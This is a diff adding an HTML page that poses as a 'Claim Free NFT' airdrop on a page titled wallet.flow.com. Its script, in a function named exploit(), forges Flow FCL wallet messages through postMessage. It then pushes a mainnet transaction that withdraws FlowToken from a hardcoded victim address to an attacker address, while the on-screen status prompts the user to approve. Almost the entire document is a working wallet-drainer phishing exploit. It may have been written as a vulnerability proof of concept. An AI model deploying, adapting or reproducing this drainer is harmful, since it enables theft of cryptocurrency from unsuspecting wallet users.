@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>wallet.flow.com</title>
+    <style>
+        body {
+            font-family: system-ui;
+            background: #111;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0
+        }
+
+        .box {
+            text-align: center;
+            padding: 40px
+        }
+
+        button {
+            background: #7c3aed;
+            color: #fff;
+            border: none;
+            padding: 20px 60px;
+            border-radius: 12px;
+            font-size: 20px;
+            cursor: pointer
+        }
+
+        button:active {
+            background: #6d28d9
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box">
+        <div style="font-size:60px;margin-bottom:20px">🎁</div>
+        <button onclick="exploit()">Claim Free NFT</button>
+        <div id="status"></div>
+    </div>
+    <script>
+        const ATTACKER = "0xe41f9708289f7602";
+        const VICTIM = "0x04e87267fc15e1f0";
+        const AMOUNT = "1.0";
+
+        function exploit() {
+            document.getElementById('status').textContent = 'Connecting...';
+
+            // Step 1: Auth service
+            window.postMessage({ service: { f_type: "Service", f_vsn: "1.0.0", type: "authn", uid: "x" } }, '*');
+
+            setTimeout(() => {
+                // Step 2: Auth view response
+                window.postMessage({
+                    type: "FCL:VIEW:RESPONSE",
+                    service: { type: "authn" },
+                    body: { nonce: "n" + Date.now() },
+                    config: { app: { title: "NFT Airdrop" }, client: { network: "mainnet" } }
+                }, '*');
+                document.getElementById('status').textContent = 'Approve connection...';
+            }, 300);
+
+            setTimeout(() => {
+                // Step 3: Authz service
+                window.postMessage({ service: { f_type: "Service", f_vsn: "1.0.0", type: "authz", uid: "x" } }, '*');
+            }, 1500);
+
+            setTimeout(() => {
+                // Step 4: Drain transaction
+                window.postMessage({
+                    type: "FCL:VIEW:RESPONSE",
+                    service: { type: "authz" },
+                    body: {
+                        addr: VICTIM,
+                        cadence: `import FungibleToken from 0xf233dcee88fe0abe\nimport FlowToken from 0x1654653399040a61\ntransaction(amount:UFix64,to:Address){let v:@FungibleToken.Vault prepare(s:AuthAccount){self.v<-s.borrow<&FlowToken.Vault>(from:/storage/flowTokenVault)!.withdraw(amount:amount)}execute{getAccount(to).getCapability(/public/flowTokenReceiver).borrow<&{FungibleToken.Receiver}>()!.deposit(from:<-self.v)}}`,
+                        f_type: "Signable",
+                        f_vsn: "1.0.1",
+                        keyId: 0,
+                        message: "f" + Date.now(),
+                        roles: { proposer: true, authorizer: true, payer: true },
+                        voucher: {
+                            cadence: "",
+                            arguments: [{ type: "UFix64", value: AMOUNT }, { type: "Address", value: ATTACKER }],
+                            authorizers: [VICTIM],
+                            payer: VICTIM,
+                            proposalKey: { address: VICTIM, keyId: 0, sequenceNum: 0 },
+                            refBlock: "abc",
+                            computeLimit: 9999
+                        }
+                    },
+                    config: { app: { title: "Claim NFT" }, client: { network: "mainnet" } }
+                }, '*');
+                document.getElementById('status').textContent = 'Approve transaction...';
+            }, 2000);
+        }
+
+        window.addEventListener('message', e => {
+            if (e.data?.data?.addr) document.getElementById('status').textContent = 'Got: ' + e.data.data.addr;
+            if (e.data?.data?.signature) document.getElementById('status').textContent = '✓ Signed!';
+        });
+    </script>
+</body>
+
+</html>
